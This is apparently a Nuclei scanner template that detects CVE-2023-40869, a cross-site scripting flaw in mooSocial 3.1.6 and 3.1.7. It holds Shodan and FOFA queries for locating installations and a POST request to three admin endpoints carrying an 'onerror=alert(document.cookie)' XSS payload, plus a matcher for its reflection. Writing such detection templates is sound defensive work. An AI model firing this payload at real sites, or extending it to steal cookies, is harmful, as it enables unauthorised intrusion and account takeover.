id: CVE-2023-40869

info:
  name: mooSocial XSS Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: Cross Site Scripting vulnerability in mooSocial mooSocial Software 3.1.6 and 3.1.7 allows a remote attacker to execute arbitrary code via a crafted script to the edit_menu, copuon, and group_categorias functions.
  impact: |
    Successful exploitation could lead to unauthorized access, data theft, and potential compromise of user accounts.
  remediation: |
    Apply the latest security patches provided by the vendor to mitigate the XSS vulnerability in mooSocial.
  reference:
    - https://github.com/MinoTauro2020/CVE-2023-40869
    - https://github.com/nomi-sec/PoC-in-GitHub
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2023-40869
    cwe-id: CWE-79
    epss-score: 0.00123
    epss-percentile: 0.48221
    cpe: cpe:2.3:a:moosocial:moosocial:3.1.6:*:*:*:*:*:*:*
  metadata:
    vendor: moosocial
    product: moosocial
    shodan-query:
      - http.favicon.hash:"702863115"
      - http.html:"moosocial installation"
    fofa-query:
      - body="moosocial installation"
      - icon_hash="702863115"

http:
  - method: POST
    path:
      - "{{BaseURL}}/admin/group/group_categories/save"
      - "{{BaseURL}}/admin/coupon/"
      - "{{BaseURL}}/admin/menu/manage/edit_menu/6"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: |
      data[id]=&data[name]=test"><img src=a onerror=alert(document.cookie)>test&data[type]=Group&data[header]=0&data[header]=1&data[parent_id]=0&data[description]=&data[active]=0&data[active]=1&data[everyone]=0&data[everyone]=1
    matchers:
      - type: word
        words:
          - "test\"><img src=a onerror=alert(document.cookie)>test"
        part: body
